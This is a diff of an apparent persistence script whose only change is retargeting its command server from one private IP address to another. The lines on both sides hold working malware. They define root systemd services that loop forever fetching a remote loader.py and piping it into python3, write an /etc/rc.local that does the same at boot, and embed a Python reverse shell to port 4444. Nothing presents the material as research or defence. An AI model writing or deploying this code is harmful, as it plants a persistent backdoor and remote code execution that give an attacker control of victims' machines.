@@ -31,7 +31,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 30; done"
+ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.151:8000/loader.py | python3 -; sleep 30; done"
 Restart=always
 RestartSec=10
 User=root
@@ -61,7 +61,7 @@ EOF
     else
         cat > /etc/rc.local << 'EOF'
 #!/bin/bash
-curl -s http://192.168.1.167:8000/loader.py | python3 - &
+curl -s http://192.168.1.151:8000/loader.py | python3 - &
 exit 0
 EOF
         chmod +x /etc/rc.local
@@ -100,7 +100,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 45; done"
+ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.151:8000/loader.py | python3 -; sleep 45; done"
 Restart=always
 RestartSec=15
 
@@ -132,7 +132,7 @@ start_execution() {
 import socket,subprocess,os
 try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('192.168.1.167',4444))
+    s.connect(('192.168.1.151',4444))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
